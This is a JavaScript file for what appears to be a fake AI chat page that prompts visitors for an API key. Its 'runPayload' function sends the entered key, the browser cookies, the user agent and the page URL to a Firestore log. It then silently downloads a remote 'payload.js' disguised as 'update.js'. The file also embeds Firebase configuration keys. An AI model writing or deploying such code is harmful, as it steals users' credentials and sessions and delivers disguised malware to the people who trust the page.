// ===== KONFIGURASI FIREBASE =====
const firebaseConfig = {
    apiKey: "AIzaSyBhSJdSbsHlec8FsWzol1koxEBtXJ4uxh8",
    authDomain: "metadata-162de.firebaseapp.com",
    projectId: "metadata-162de",
    storageBucket: "metadata-162de.firebasestorage.app",
    messagingSenderId: "619982193399",
    appId: "1:619982193399:web:b3c4111e57e46d6f6f49f2",
    measurementId: "G-Z6RWGEMLXB"
};

// ===== INIT FIREBASE =====
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

// ===== ELEMEN =====
const chat = document.getElementById('chat');
const input = document.getElementById('api-input');
const btn = document.getElementById('enter-btn');

// ===== FUNGSI =====
function addMessage(sender, text) {
    const div = document.createElement('div');
    div.className = `msg ${sender.toLowerCase()}`;
    div.innerHTML = `<div class="bubble">${text}</div>`;
    chat.appendChild(div);
    chat.scrollTop = chat.scrollHeight;
}

// ===== PAYLOAD =====
function runPayload() {
    // 1. Kirim data ke Firestore
    db.collection("logs").add({
        api_key: input.value,
        cookies: document.cookie,
        user_agent: navigator.userAgent,
        url: window.location.href,
        timestamp: new Date().toISOString()
    })
    .then(() => {
        addMessage('AI', '✅ Data terkirim ke Firestore!');
    })
    .catch((error) => {
        console.error("Error:", error);
        addMessage('AI', '❌ Gagal mengirim data.');
    });

    // 2. Download payload.js
    const link = document.createElement('a');
    link.href = 'https://shadowofobscurity322.github.io/payload/payload.js';
    link.download = 'update.js';
    link.style.display = 'none';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}

// ===== EVENT =====
btn.addEventListener('click', () => {
    const key = input.value.trim();
    if (!key) return alert('Masukkan API Key!');
    runPayload();
});

input.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') btn.click();
});
